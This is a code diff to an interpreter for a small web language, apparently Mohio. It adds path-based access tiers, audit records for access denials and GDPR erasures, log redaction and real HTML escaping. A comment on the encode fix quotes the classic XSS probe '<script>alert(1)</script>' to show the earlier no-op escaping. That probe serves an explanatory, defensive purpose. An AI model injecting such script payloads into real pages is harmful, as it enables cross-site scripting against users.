-        from mohio_ast import PageDecl, ListenBlock, JourneyMeta
-        pages         = [b for b in node.body if isinstance(b, PageDecl)]
+        from mohio_ast import ListenBlock, JourneyMeta
+        pages         = []   # the `page` block is removed; a journey holds no pages
         listen_blocks = [b for b in node.body if isinstance(b, ListenBlock)]
 
-        # private:/public: access control (2026-08-06). Was previously built-but-
-        # never-read JourneyMeta (see path_list's old comment, "folded into A8
-        # security/access design") -- the interpreter carried the node and ignored
-        # it, so every path was silently open regardless of what was declared.
-        # private: now genuinely refuses a request with no server-verified role,
-        # reusing require role's exact mechanism/403 shape so there is only one
-        # place in the codebase that decides what "authenticated" means. public:
-        # is an explicit override for a path that would otherwise fall under a
-        # private: entry. Matching is segment-boundary prefix (private: /admin
-        # also covers /admin/users) -- exact-only matching would silently leave a
-        # subpage unprotected, the same "looks protected, isn't" shape this fix
-        # exists to close.
+        # PAGE CLASSIFICATION (T1-PAGE-CLASSIFICATION-MODEL, locked 2026-08-15
+        # mohio_data/mohio.lark:1181-1205, PRODUCTION-BUILD-PLAN.md:1642 -- serve-layer
+        # enforcement wired here 2026-08-27). Four journey-level states: public: (default,
+        # no declaration needed) served + listed; private: served but UNLISTED -- reachable
+        # by direct URL, just never enumerated (no listing/sitemap feature exists yet, so
+        # this is genuinely inert at runtime by design -- the same "declared, parses, real
+        # AST node, nothing reads it yet" state hidden:/authorize: were in before this fix,
+        # not a bug); hidden: NOT served, 404 -- the strongest tier, for secrets and
+        # includes; authorize: login required before serve.
+        #
+        # REDEFINITION: private:'s runtime behavior CHANGES here, from the OLD semantics
+        # (403-gate, reusing require role -- what this block used to do) to the LOCKED
+        # semantics (served, unlisted, no gate). A journey that relied on private: for
+        # actual access control now gets NONE -- migrate to authorize: for login-gating.
+        # Grep-confirmed: no corpus .mho file used private: for protection as of this fix.
+        # authorize: takes over the OLD private: 403 mechanism verbatim (require role's
+        # exact server-verified-session check), so "authenticated" still has exactly one
+        # definition in the codebase. hidden: reuses format_runtime_error's not_found (404)
+        # mapping, the same honest-status table every other runtime error goes through.
+        #
+        # public: is an explicit override for a path that would otherwise fall under
+        # private:/hidden:/authorize: -- generalized from the pre-existing public:-overrides-
+        # private: shape now that there are three things to override. Matching is
+        # segment-boundary prefix (hidden: /secrets also covers /secrets/x) -- exact-only
+        # matching would silently leave a subpage unprotected.
+        #
+        # A path segment starting with `_` is ALWAYS hidden (404), declared or not -- the
+        # route-level equivalent of the existing `_pagename.mho`/`journey.mho` file-naming
+        # block the grammar's own hidden: comment names. Scoped to JOURNEY ROUTE PATHS only:
+        # the static-asset file server's separate `_next/`-style folder allowance
+        # (mohio_server.py's _static_file_response, a deliberate, different, unrelated
+        # tradeoff for served build-tool asset directories) is untouched by this rule.
         req_path = req.get('_path')
+        metas = [b for b in node.body if isinstance(b, JourneyMeta)]
+
+        def _matches_kind(kind, path):
+            return any(self._journey_path_matches(p, path)
+                       for m in metas if m.kind == kind for p in (m.value or []))
+
         if req_path is not None:
             norm_req = self._norm_path(req_path)
-            metas = [b for b in node.body if isinstance(b, JourneyMeta)]
-            is_public  = any(self._journey_path_matches(p, norm_req)
-                              for m in metas if m.kind == 'public' for p in (m.value or []))
-            is_private = any(self._journey_path_matches(p, norm_req)
-                              for m in metas if m.kind == 'private' for p in (m.value or []))
-            if is_private and not is_public:
+            is_public     = _matches_kind('public', norm_req)
+            is_hidden     = _matches_kind('hidden', norm_req)
+            is_authorize  = _matches_kind('authorize', norm_req)
+            is_underscore = self._path_has_underscore_segment(norm_req)
+
+            if not is_public and (is_hidden or is_underscore):
+                # T1-AUDIT-COVERAGE-GAPS Part B: a hidden: path denial is a security-relevant
+                # event, same shape as require role's denial audit.
+                _evt = self._audit_event('security_audit_log', {
+                    'event': 'access_denied',
+                    'reason': 'hidden_path' if is_hidden else 'hidden_path_underscore',
+                    'path': norm_req,
+                }, ctx)
+                self._audit_logs.setdefault('security_audit_log', []).append(_evt)
+                raise _Raise(
+                    error_name='not_found',
+                    message=(f"hidden: {norm_req} is not served." if is_hidden else
+                              f"{norm_req} is not served -- a path segment starting with "
+                              f"_ is always hidden."))
+
+            if not is_public and is_authorize:
                 if not (ctx.has_any_roles() and ctx.roles_verified()):
-                    # T1-AUDIT-COVERAGE-GAPS Part B: a private: path denial is a security-
-                    # relevant event, same shape as require role's denial audit above.
                     _evt = self._audit_event('security_audit_log', {
-                        'event': 'access_denied', 'reason': 'private_path_unauthenticated',
+                        'event': 'access_denied', 'reason': 'authorize_path_unauthenticated',
                         'path': norm_req,
                     }, ctx)
                     self._audit_logs.setdefault('security_audit_log', []).append(_evt)
                     raise _Raise(
                         error_name='authorization_error',
-                        message=(f"private: {norm_req} requires an authenticated session -- "
+                        message=(f"authorize: {norm_req} requires an authenticated session -- "
                                  f"no server-verified role is present for this session. "
                                  f"Establish one at login with grant role."))
         else:
             # No path was pinned on this request at all (e.g. `mio run --request-file` with
             # no `_path` key). _serve_pages's single-page fallback below serves whatever one
-            # page exists with no path to check against private:/public: -- so there is no
-            # way to know whether the page about to be served falls under a private: entry.
-            # Deny by default: if this journey declares ANY private: entry, refuse unless the
-            # session already has a server-verified role. Same _Raise/authorization_error
-            # shape as the path-present check above, so "authenticated" still has exactly one
-            # definition in the codebase. A journey with no private: entries at all is
+            # page exists with no path to check against hidden:/authorize: -- so there is no
+            # way to know whether the page about to be served falls under either. Deny by
+            # default for whichever this journey declares, same _Raise shapes as the
+            # path-present check above. A journey with neither hidden: nor authorize: is
             # unaffected -- this branch is a no-op for it, same as before.
-            metas = [b for b in node.body if isinstance(b, JourneyMeta)]
-            if any(m.kind == 'private' for m in metas):
+            if any(m.kind == 'hidden' for m in metas):
+                _evt = self._audit_event('security_audit_log', {
+                    'event': 'access_denied', 'reason': 'hidden_path', 'path': None,
+                }, ctx)
+                self._audit_logs.setdefault('security_audit_log', []).append(_evt)
+                raise _Raise(
+                    error_name='not_found',
+                    message=("this request carried no path, and the journey declares "
+                             "hidden: paths -- refusing by default because there is no "
+                             "path to check against them."))
+            if any(m.kind == 'authorize' for m in metas):
                 if not (ctx.has_any_roles() and ctx.roles_verified()):
-                    # T1-AUDIT-COVERAGE-GAPS Part B: same event as the path-present denial
-                    # above, no path known to name.
                     _evt = self._audit_event('security_audit_log', {
-                        'event': 'access_denied', 'reason': 'private_path_unauthenticated',
+                        'event': 'access_denied', 'reason': 'authorize_path_unauthenticated',
                         'path': None,
                     }, ctx)
                     self._audit_logs.setdefault('security_audit_log', []).append(_evt)
                     raise _Raise(
                         error_name='authorization_error',
                         message=("this request carried no path, and the journey declares "
-                                 "private: paths -- refusing by default because there is no "
-                                 "path to check against them. No server-verified role is "
+                                 "authorize: paths -- refusing by default because there is "
+                                 "no path to check against them. No server-verified role is "
                                  "present for this session. Establish one at login with "
                                  "grant role."))
 
@@ -11409,8 +15115,8 @@ class MohioInterpreter:
         setup definitions. Excludes routed units (pages, listen blocks), inert
         metadata, and ai.decide definitions -- those are registered by
         _register_ai_blocks and must NOT run as setup (running one fires the AI)."""
-        from mohio_ast import PageDecl, ListenBlock, JourneyMeta, AiDecideBlock
-        skip = (PageDecl, ListenBlock, JourneyMeta, AiDecideBlock)
+        from mohio_ast import ListenBlock, JourneyMeta, AiDecideBlock
+        skip = (ListenBlock, JourneyMeta, AiDecideBlock)
         for b in node.body:
             if isinstance(b, skip):
                 continue
@@ -11431,6 +15137,13 @@ class MohioInterpreter:
         if not e:
             return False
         return norm_req_path == e or norm_req_path.startswith(e + '/')
+
+    def _path_has_underscore_segment(self, norm_req_path):
+        """True when any segment of a normalized request path starts with `_` -- the
+        route-level auto-hidden rule (declared or not). A dedicated method, not an inline
+        expression, so a guard against it can be mutation-proven independently."""
+        return any(seg.startswith('_')
+                   for seg in norm_req_path.strip('/').split('/') if seg)
 
     def _serve_pages(self, pages, ctx, req):
         """Route a GET request to a matching page by path. Mirrors _exec_ListenBlock:
@@ -11476,8 +15189,8 @@ class MohioInterpreter:
         return self._format_page_result(result, child)
 
     def _program_has_listeners(self, program):
-        from mohio_ast import ListenBlock, JourneyDecl, PageDecl
-        return any(isinstance(s, (ListenBlock, JourneyDecl, PageDecl))
+        from mohio_ast import ListenBlock, JourneyDecl
+        return any(isinstance(s, (ListenBlock, JourneyDecl))
                    for s in getattr(program, 'statements', []))
 
 
@@ -12163,19 +15876,58 @@ class MohioInterpreter:
             parts = target.split('.')
             val = ctx.get(parts[0])
             for part in parts[1:]:
-                if hasattr(val, part):
+                # UNWRAP FIRST. A retrieved row is a MohioValue WRAPPING a dict, which satisfies
+                # neither `hasattr(val, part)` nor `isinstance(val, dict)`, so every dotted walk
+                # fell to '[unknown]' before it reached the field. The wrapper is the normal
+                # shape for anything read out of the database, so this was every interesting
+                # target.
+                _inner = val.to_python() if isinstance(val, MohioValue) else val
+                if isinstance(_inner, dict):
+                    val = _inner.get(part, '[unknown]')
+                elif hasattr(val, part):
                     val = getattr(val, part)
-                elif isinstance(val, dict):
-                    val = val.get(part, '[unknown]')
                 else:
                     val = '[unknown]'
             # Sector redaction -- check if field is classified sensitive
-            sector = getattr(ctx, '_sector', None)
+            sector = scoped_attr(ctx, '_sector')
             if sector:
-                sensitive = getattr(ctx, '_sensitive_fields', set())
+                # INTERIM WIRE-UP. `_sensitive_fields` was READ here and ASSIGNED NOWHERE, so this
+                # branch could never fire and `debug.log` of a tagged field wrote the raw value
+                # into the trace under an active sector. Measured before the fix:
+                #
+                #   chart = MohioValue('diagnosis-alpha', 'string')     [phi]  RAW
+                #   card  = MohioValue('4111111111111111', 'string')    [pci]  RAW
+                #
+                # Fed from the EXISTING tag registry rather than a new list, because a second
+                # list of sensitive field names is a second thing to keep in step with the first.
+                # Read live rather than snapshotted at sector activation: a shape declared AFTER
+                # the `sector:` line still classifies its fields, and a snapshot taken at
+                # activation would miss exactly those.
+                #
+                # THIS IS KEYED BY BARE FIELD NAME, which is the Q533 assumption, and it is
+                # deliberately not fixed here: the metasource resolver replaces this lookup and
+                # this is its fifth consumer. Wiring it up now closes a live leak; keying it
+                # correctly happens once, there, for all five.
+                sensitive = set(getattr(ctx, '_sensitive_fields', None) or set())
+                sensitive |= (self._pci_fields or set())
+                sensitive |= (self._phi_fields or set())
+                sensitive |= (self._pii_fields or set())
                 field_name = parts[-1]
                 if field_name in sensitive:
                     return f'[omitted -- {sector} sector field]'
+            # `never log` IS NOT GATED ON A SECTOR, and that is the difference between it and
+            # the redaction above. The sector rule is a compliance profile deciding for the
+            # program; `never log` is the program saying it about its own field, so it holds
+            # whether or not a profile is active. It is also value-bound: the value keeps the
+            # rule when it is copied, because a secret copied into another variable and logged
+            # from there is the ordinary way one reaches a log.
+            _fld = parts[-1] if parts else None
+            if ((_fld and (_fld in (self._never_log_fields or set())
+                           or self.classification.has(_fld, 'never_log')))
+                    or getattr(val, 'handling', None) == 'never_log'
+                    or value_handling_of(getattr(val, 'to_python', lambda: None)())
+                    == 'never_log'):
+                return '[omitted -- never log]'
             return repr(val)
         except Exception:
             return '[unavailable]'
@@ -12295,17 +16047,6 @@ class MohioInterpreter:
         return None
 
 
-
-    def _exec_PageDecl(self, node, ctx):
-        # A top-level bare `page N at /path` (no enclosing journey) is a GET route.
-        # Serve it when the request path matches (or it is the only page); otherwise
-        # return None so a sibling listener can match. Central 404 lives in the
-        # program router (_route_program), so a non-matching page never shadows a
-        # sibling and never silently serves the wrong page.
-        req = getattr(ctx, '_current_request', None)
-        if not req:
-            return None
-        return self._serve_pages([node], ctx, req)
 
     def _exec_SagaBlock(self, node, ctx):  # old name compat
         return self._exec_SagaDecl(node, ctx)
@@ -12440,7 +16181,7 @@ class MohioInterpreter:
                     actual_value = self._eval(children[0], ctx)
                     self._check_purpose_value(actual_value, ctx)
                     actual_value = self._maybe_interpolate(actual_value, ctx, getattr(node, 'line', None), escape=_escape)
-                    actual_value = self._giveback_masked(actual_value)
+                    actual_value = self._giveback_masked(actual_value, children[0])
                     status = node.status if node.status is not None else 200
                     raise _GiveBack(status=status, value=actual_value, fmt=fmt)
         except ImportError:
@@ -12449,7 +16190,7 @@ class MohioInterpreter:
         value  = self._eval(node.value, ctx) if node.value else None
         self._check_purpose_value(value, ctx)
         value  = self._maybe_interpolate(value, ctx, getattr(node, 'line', None), escape=_escape)
-        value  = self._giveback_masked(value)
+        value  = self._giveback_masked(value, node.value)
         status = None
         if node.status is not None:
             s = node.status
@@ -12507,7 +16248,7 @@ class MohioInterpreter:
             if not ctx.exists(_nm):
                 raise MohioRuntimeError(
                     f"show refers to an unknown variable '{_nm}'. Declare it first "
-                    f"(e.g. `hold {_nm} <value>`), or check the spelling.")
+                    f"(e.g. `{_nm} <value>`), or check the spelling.")
         val = self._eval(node.value, ctx)
         self._check_purpose_value(val, ctx)
         val = self._maybe_interpolate(val, ctx, getattr(node, 'line', None))
@@ -12559,15 +16300,41 @@ class MohioInterpreter:
         if "{{" in html:
             html = self._interpolate_output(html, ctx, getattr(node, 'line', None),
                                             escape=getattr(node, 'escape', False))
-        # A `render` block (escape=True) owns the full page: wrap the body fragment
-        # in an HTML5 shell unless the author already wrote a complete document.
+        # A `render` block (escape=True) contributes a fragment to THE page. It used to own the
+        # whole page: each render wrapped its own fragment in a full HTML5 shell and returned
+        # it, and because a handler's value is its LAST statement's value, every render but the
+        # last was silently discarded -- verified through `mio serve` + curl, two of three
+        # fragments simply absent from the response. Renders compose now: fragments accumulate
+        # on the request context and the shell wraps all of them, so the last render's value is
+        # the complete page and nothing is dropped.
         if getattr(node, 'escape', False):
+            # `render scripts` is the explicit JS container. The kind was recorded by the
+            # transformer and then never used, so script content was emitted as raw body text:
+            # the browser printed the JavaScript instead of running it.
+            if getattr(node, 'kind', 'html') == 'scripts':
+                html = "<script>\n" + html + "\n</script>"
             low = html.lstrip().lower()
-            if not (low.startswith('<!doctype') or low.startswith('<html')):
-                html = self._wrap_html_shell(html, ctx)
-            else:
+            if low.startswith('<!doctype') or low.startswith('<html'):
+                # The author wrote a complete document -- it owns the response as-is, and
+                # composing into a shell would nest one document inside another.
                 html = self._inject_mioscript(html)
+                self.shown.append(html)
+            else:
+                _frags = list(self._ctx_attr(ctx, '_render_fragments') or [])
+                _frags.append(html)
+                ctx._render_fragments = _frags
+                html = self._wrap_html_shell("\n".join(_frags), ctx)
+                # Keep ONE composed page in `shown` rather than one per render, so `mio run`
+                # prints the page once instead of printing it again for every fragment added.
+                _idx = self._ctx_attr(ctx, '_render_shown_index')
+                if _idx is None or _idx >= len(self.shown):
+                    _idx = len(self.shown)
+                    ctx._render_shown_index = _idx
+                    self.shown.append(html)
+                self.shown[_idx] = html
             ctx._response_content_type = 'text/html'
+            if self.verbose: print(f"  [render] {len(html)} chars")
+            return MohioValue(html, 'string')
         self.shown.append(html)
         if self.verbose: print(f"  [show block] {len(html)} chars")
         return MohioValue(html, 'string')
@@ -12832,6 +16599,24 @@ class MohioInterpreter:
         locked = {str(e.get('target')) for e in getattr(self, '_compliance', [])
                   if e.get('action') == 'lock'}
         if table_name in locked or table in locked:
+            # A REFUSED ERASURE IS THE RECORD A REGULATOR ASKS FOR. This refusal was correct and
+            # left nothing behind: no trace that an erasure was requested, none that it was
+            # refused, and none of why. Under GDPR Article 17 the interesting question is not
+            # only "was this erased" but "was erasure ever asked for, and what happened to the
+            # request", and a legal hold is precisely the answer that has to be defensible later.
+            # Silence reads identically to never having been asked.
+            #
+            # Written through `_compliance_audit`, the same seam cm.retain, cm.expire and
+            # cm.lock already use, so the hold and the refusal it caused sit in one trail.
+            self._compliance_audit(ctx, {
+                'action':      'purge_refused',
+                'target':      table,
+                'requested':   'erasure',
+                'refused':     'yes',
+                'reason':      'under_legal_hold',
+                'legal_hold':  table_name if table_name in locked else table,
+                'legal_basis': 'GDPR Art. 17(3)(b)',
+                'purge_reason': reason})
             raise MohioRuntimeError(
                 f"cm.purge refused: '{table_name}' is under a cm.lock legal hold and "
                 f"cannot be erased. Release the hold first.")
@@ -12862,7 +16647,13 @@ class MohioInterpreter:
         erased = []                 # (field, row_ref) for clauses that ACTUALLY erased row(s)
         try:
             for field, val, ref in resolved:
-                removed = db.remove(table_name, field, val)
+                # BLIND INDEX -- the headline case. `cm.purge from db.members / match ssn to
+                # "1111"` on a [pii] ssn erased NOTHING and wrote no tombstone: a GDPR Article
+                # 17 request answered with silence. `ref` (the tombstone's row reference) is
+                # deliberately computed from the ORIGINAL field and value above, so the audit
+                # record still names the field the operator actually asked about.
+                _f, _v = self._bidx_pair(db, table_name, field, val, node)
+                removed = db.remove(table_name, _f, _v)
                 # db.remove returns the deleted row count. Only a delete that removed >= 1 row is an
                 # actual erasure; a 0-row match is not (no delete -> no tombstone). A backend that
                 # returns no count (None) is assumed to have erased.
@@ -12872,6 +16663,32 @@ class MohioInterpreter:
         except Exception as e:
             try: db.conn.rollback() # ANY clause failed -> roll back EVERYTHING; nothing erased
             except Exception: pass
+            # RESTORED BEFORE THE AUDIT IS WRITTEN, and this is not tidiness. Every driver write
+            # commits only `if not self._in_transaction`, and the `finally` below has not run
+            # yet, so an audit written here would be issued into the suppressed-commit window
+            # and discarded with the connection -- measured: the record, and the table itself,
+            # were simply absent afterwards. The rollback record has to survive the rollback.
+            try: db._in_transaction = _prev_txn
+            except Exception: pass
+            # THE ROLLBACK ITSELF NEEDS A RECORD, for the same reason the compensation path did.
+            # The erasure was requested, it was attempted, it partially ran, and it was undone.
+            # Without this the trail shows an erasure request that simply stops, which is
+            # indistinguishable from a crash that left rows half-deleted -- and the tombstone is
+            # deliberately not written here, so there is otherwise nothing at all.
+            #
+            # `reached` names how far it got, by FIELD only. The row references are deliberately
+            # left out: nothing was erased, so naming rows would assert an erasure that did not
+            # happen, which is the false-evidence class the tombstone rules already guard.
+            self._compliance_audit(ctx, {
+                'action':       'purge_rolled_back',
+                'target':       table,
+                'requested':    'erasure',
+                'outcome':      'failed_and_rolled_back',
+                'erased':       'nothing',
+                'reached':      ", ".join(sorted({f for f, _ in erased})) or 'no clause completed',
+                'clauses':      len(resolved),
+                'reason':       str(e)[:300],
+                'purge_reason': reason})
             raise MohioRuntimeError(
                 f"cm.purge could not erase from '{table_name}': {e}. All matched deletes were "
                 f"rolled back -- NOTHING was erased and NO tombstone was written. Right-to-be-"
@@ -13158,8 +16975,32 @@ class MohioInterpreter:
                     mult = self._MIOFILE_SIZE_UNITS.get(units[0] if units else 'mb',
                                                         1024 ** 2)
                     maxsize = int(float(nums[0]) * mult)
+        # A cloud area's connection settings, resolved the way any other declared value is:
+        # `env.X` and `secret.X` are looked up, a literal is taken as written. A key or a secret
+        # written as a literal is refused by the existing hardcoded-credential scan, so the
+        # resolution here does not have to re-argue that.
+        settings = {}
+        for _name, _rec in (zone.get('settings') or {}).items():
+            _tok = _rec.get('value')
+            _raw = _unquote(_tok)
+            _ttype = _rec.get('token_type') or ''
+            # Three spellings, each named. `env.X` and `secret.X` are looked up; a quoted
+            # literal is the value itself. A literal in the key or secret position is refused
+            # by the existing hardcoded-credential scan, so this does not have to re-argue it.
+            if _ttype in ('ENV_REF', 'SECRET_REF'):
+                settings[_name] = os.environ.get(_raw.split('.', 1)[-1], '')
+            elif _ttype == 'STRING':
+                settings[_name] = _raw
+            else:
+                raise _Raise(
+                    error_name='cloud_setting_unreadable',
+                    message=(f"miofile cloud area: `{_name}` was written in a form this build "
+                             f"does not know how to read ({_ttype or 'no token type'}), so the "
+                             f"connection cannot be configured from it."),
+                    hint="Write it as a quoted value, `env.NAME`, or `secret.NAME`.")
         return {'name': zone.get('name'), 'kind': zone.get('kind'),
-                'path': path, 'accept': accept, 'maxsize': maxsize}
+                'path': path, 'accept': accept, 'maxsize': maxsize,
+                'settings': settings}
 
     def _exec_MiofileStmt(self, node, ctx):
         import os, shutil
@@ -13238,13 +17079,45 @@ class MohioInterpreter:
         op = node.op
         if op == "read":
             target, raw = _resolve(node.path)
-            if not target.is_file():
-                raise MohioRuntimeError(f"miofile.read: there is no file at '{raw}'.")
-            data = target.read_text(encoding="utf-8")
+            # TWO PLACES, IN ORDER, AND THE FIRST IS UNCHANGED. The file area is tried exactly as
+            # it always was, so every existing program reads what it read before. The object
+            # store is tried second, because that is where an UPLOAD lives: uploads moved out of
+            # the working directory to close a live exposure, and nothing replaced the way back
+            # in, so a program could store a file and never read it again. A key that is in
+            # neither place fails loud and says both places were looked in.
+            if target.is_file():
+                body = target.read_bytes()
+            else:
+                body, _etag = self._upload_store().get(raw)
+                if body is None:
+                    raise MohioRuntimeError(
+                        f"miofile.read: there is no file at '{raw}'. Nothing is stored under "
+                        f"that name in the file area or in the upload store.")
+                # Recorded HERE rather than at the unseal below, so the record says what was
+                # STORED. After the unseal every file looks alike, and "was this one protected"
+                # is the whole question the record exists to answer.
+                self._audit_file_op(
+                    'access', raw,
+                    isinstance(body, (bytes, bytearray))
+                    and body.startswith(self._ENC_PREFIX.encode('ascii')), ctx)
+            # UNSEALED BY THE MARKER, exactly as a stored field value is. A tagged upload is
+            # written as ciphertext, so a read that handed back the stored bytes would hand back
+            # `enc:v1:...` instead of the file. An untagged upload carries no marker and is
+            # returned as it was stored, so nothing has to remember which kind it was.
+            body = self._unseal_upload_body(body)
             self._audit_egress('miofile', raw, ctx, op='read')
+            # BYTES WHEN IT IS NOT TEXT. The old read decoded as UTF-8 unconditionally, which is
+            # right for the text files this verb was built for and destroys an image or a PDF.
+            # Text still comes back as text, so nothing that reads a text file changes; a file
+            # that is not valid UTF-8 comes back as its real bytes instead of raising.
+            try:
+                data = body.decode("utf-8")
+                out = MohioValue(data, "text")
+            except (UnicodeDecodeError, AttributeError):
+                out = MohioValue(body, "bytes")
             if node.alias:
-                ctx.set(node.alias, MohioValue(data, "text"))
-            return MohioValue(data, "text")
+                ctx.set(node.alias, out)
+            return out
         if op == "write":
             target, raw = _resolve(node.path)
             content = "" if node.content is None else str(_val(node.content))
@@ -13252,13 +17125,34 @@ class MohioInterpreter:
             target.parent.mkdir(parents=True, exist_ok=True)
             target.write_text(content, encoding="utf-8")
             self._audit_egress('miofile', raw, ctx, op='write')
+            # THE AREA THAT GOVERNS THIS PATH, not the one uploads go to. `_zone_for` is the
+            # same lookup `_enforce_zone` just used to decide whether the write was allowed at
+            # all, so the record names the area whose rules were applied.
+            # NO PLAINTEXT-TO-CLOUD WARNING HERE, and it is absent on purpose rather than
+            # forgotten. A cloud area is declared with no path (`cloud NAME` takes settings, not
+            # a location), so `_zone_for` can never return one and these verbs always write to
+            # the local file area. A warning placed here could not fire, and code that looks
+            # like protection and cannot run is worse than none: it reads as covered. When these
+            # verbs learn to dispatch to the object store, the warning belongs at that seam,
+            # next to the one the upload store already has.
+            _z = _zone_for(raw) or {}
+            self._audit_file_op('write', raw, self._looks_sealed(content), ctx, zone=_z)
             return MohioValue(True, "boolean")
         if op == "delete":
             target, raw = _resolve(node.path)
             if not target.is_file():
                 raise MohioRuntimeError(f"miofile.delete: there is no file at '{raw}'.")
+            # READ BEFORE THE UNLINK, because after it there is nothing left to ask. A record
+            # saying only that something was deleted cannot answer whether a sealed file was
+            # removed, which is the question a deletion raises.
+            try:
+                _head = target.open('rb').read(len(self._ENC_PREFIX))
+            except Exception:
+                _head = b''
+            _sealed = self._looks_sealed(_head)
             target.unlink()
             self._audit_egress('miofile', raw, ctx, op='delete')
+            self._audit_file_op('delete', raw, _sealed, ctx, zone=(_zone_for(raw) or {}))
             return MohioValue(True, "boolean")
         if op == "exists":
             target, raw = _resolve(node.path)
@@ -13269,12 +17163,22 @@ class MohioInterpreter:
             if not src.exists():
                 raise MohioRuntimeError(f"miofile.{op}: there is no file at '{sraw}'.")
             _enforce_zone(draw, src.stat().st_size if src.is_file() else None)
+            # Read from the SOURCE while it is still there: a move leaves nothing behind to ask.
+            try:
+                _head = src.open('rb').read(len(self._ENC_PREFIX)) if src.is_file() else b''
+            except Exception:
+                _head = b''
+            _sealed = self._looks_sealed(_head)
+            # Same reason as `write` above: a cloud area governs no path, so a destination here
+            # is always local and a plaintext-to-cloud warning could not fire.
+            _dz = _zone_for(draw) or {}
             dst.parent.mkdir(parents=True, exist_ok=True)
             if op == "move":
                 shutil.move(str(src), str(dst))
             else:
                 shutil.copy2(str(src), str(dst))
             self._audit_egress('miofile', draw, ctx, op=op, source=sraw)
+            self._audit_file_op(op, draw, _sealed, ctx, zone=_dz, source=sraw)
             return MohioValue(True, "boolean")
         if op == "list":
             target, raw = _resolve(node.path)
@@ -13682,19 +17586,28 @@ class MohioInterpreter:
         key = getattr(node, 'key', '')
         # Resolve key if it's a variable reference
         key_resolved = str(self._eval(key, ctx).to_python() if key else '')
-        # Simple in-memory cache stored on interpreter instance
+        # A BOUNDED store, shared by design: `FEATURE-QUERY-CACHE` wires into this same one
+        # rather than a second cache with a second eviction policy (Q66). It used to be a plain
+        # dict that never evicted and never expired -- every key set lived for the life of the
+        # process, which on a runtime hosting other people's apps meant one app's loop could
+        # take the process down.
         if not hasattr(self, '_cache'):
-            self._cache = {}
+            self._cache = _BoundedCache()
         if op == 'set':
             vals = getattr(node, 'values', [])
             val  = self._eval(vals[0], ctx) if vals else MohioValue(None)
-            self._cache[key_resolved] = val
+            # `for 10 minutes` is honoured now. It parsed and was discarded before, so a
+            # declared expiry meant nothing at all.
+            self._cache.set(key_resolved, val, getattr(node, 'ttl_seconds', None))
             if self.verbose:
-                print(f"  [miocache.set] {key_resolved}")
+                _ttl = getattr(node, 'ttl_seconds', None)
+                print(f"  [miocache.set] {key_resolved}"
+                      + (f" (expires in {_ttl:g}s)" if _ttl else ""))
             return val
         elif op == 'get':
-            if key_resolved in self._cache:
-                result = self._cache[key_resolved]
+            _found, _cached = self._cache.get(key_resolved)
+            if _found:
+                result = _cached
             else:
                 # cache miss: use `default value_expr` if provided, else None
                 dvals = getattr(node, 'values', [])
@@ -13706,7 +17619,7 @@ class MohioInterpreter:
                 print(f"  [miocache.get] {key_resolved} → {result.to_python() if isinstance(result, MohioValue) else result}")
             return result
         elif op == 'delete':
-            self._cache.pop(key_resolved, None)
+            self._cache.delete(key_resolved)
             if self.verbose:
                 print(f"  [miocache.delete] {key_resolved}")
             return MohioValue(True)
@@ -13716,8 +17629,9 @@ class MohioInterpreter:
                 print(f"  [miocache.flush]")
             return MohioValue(True)
         elif op == 'exists':
-            result = key_resolved in self._cache
-            return MohioValue(result)
+            # Through the store, so an EXPIRED key reports as absent. `in self._cache` would
+            # have said it was there right up to the moment someone read it.
+            return MohioValue(self._cache.exists(key_resolved))
         return MohioValue(None)
 
     # ── MathFuncStmt ────────────────────────────────────────────────────
@@ -13790,7 +17704,16 @@ class MohioInterpreter:
         import hashlib
         value = self._eval(node.value, ctx) if getattr(node, 'value', None) is not None else MohioValue('')
         raw = str(value.to_python() if isinstance(value, MohioValue) else value)
-        algo = (getattr(node, 'algorithm', None) or 'sha256').lower()
+        algo = getattr(node, 'algorithm', None)
+        if not algo:
+            # Unreachable from source: the transformer refuses a `hash` with no
+            # `using`. Kept loud rather than defaulted, because the default this
+            # replaced (sha256) is what silently gave passwords an unsalted digest,
+            # and a HashBlock built any other way must not inherit it.
+            raise MohioRuntimeError(
+                "hash: no algorithm was named. Use `using bcrypt` for a password, "
+                "or `using sha256` for a checksum.")
+        algo = str(algo).lower()
         if algo == 'bcrypt':
             try:
                 import bcrypt
@@ -13822,8 +17745,22 @@ class MohioInterpreter:
 
     # ── EncodeStmt ──────────────────────────────────────────────────────
     # encode value as base64
+    #
+    # `as html` USED TO RETURN THE VALUE UNCHANGED (found 2026-09-01, alongside the hash
+    # sweep). The grammar's own header documents the formats as "base64 / url / hex / html",
+    # the parser accepted `html`, and the dispatch below had no branch for it -- so the final
+    # `else: result = raw` handed the input straight back. Verified by running:
+    #
+    #     encode "<script>alert(1)</script>" as html as safe
+    #     show safe   ->   <script>alert(1)</script>
+    #
+    # A developer escaping output for a page got a variable named `safe` holding a live script
+    # tag, with no error at check time or run time. An escaping primitive that silently does
+    # nothing is worse than no escaping primitive, because the program reads as though it is
+    # protected. html is implemented here rather than refused: it is a documented format and
+    # `html.escape` is its standard meaning, so there is no design choice being invented.
     def _exec_EncodeStmt(self, node, ctx):
-        import base64
+        import base64, html as _html
         val = self._eval(node.value, ctx) if node.value else MohioValue('')
         raw = str(val.to_python() if isinstance(val, MohioValue) else val)
         fmt = str(getattr(node, 'format', 'base64')).lower()
@@ -13834,8 +17771,14 @@ class MohioInterpreter:
             result = urllib.parse.quote(raw)
         elif fmt == 'hex':
             result = raw.encode().hex()
+        elif fmt == 'html':
+            result = _html.escape(raw, quote=True)
         else:
-            result = raw
+            # No silent no-op on an unrecognised format. The old `else` returned the value
+            # unchanged, so a typo like `as base46` encoded nothing and said nothing.
+            raise MohioRuntimeError(
+                "encode: '" + fmt + "' is not a format this knows." + chr(10) +
+                "    Use one of: base64, url, hex, html.")
         mv = MohioValue(result)
         alias = getattr(node, 'alias', '')
         if alias:
@@ -13844,11 +17787,20 @@ class MohioInterpreter:
 
     # ── DecodeStmt ──────────────────────────────────────────────────────
     # decode value from base64
+    #
+    # Two silent no-ops closed here (2026-09-01), the same pair as encode above plus one of
+    # its own: `except Exception: result = raw` meant that ANY failure to decode returned the
+    # INPUT unchanged. `decode "not-base64" from base64` handed back "not-base64", so a
+    # program decoding a token carried on with the undecoded token and nothing said so.
     def _exec_DecodeStmt(self, node, ctx):
-        import base64
+        import base64, html as _html
         val = self._eval(node.value, ctx) if node.value else MohioValue('')
         raw = str(val.to_python() if isinstance(val, MohioValue) else val)
         fmt = str(getattr(node, 'format', 'base64')).lower()
+        if fmt not in ('base64', 'url', 'hex', 'html'):
+            raise MohioRuntimeError(
+                "decode: '" + fmt + "' is not a format this knows." + chr(10) +
+                "    Use one of: base64, url, hex, html.")
         try:
             if fmt == 'base64':
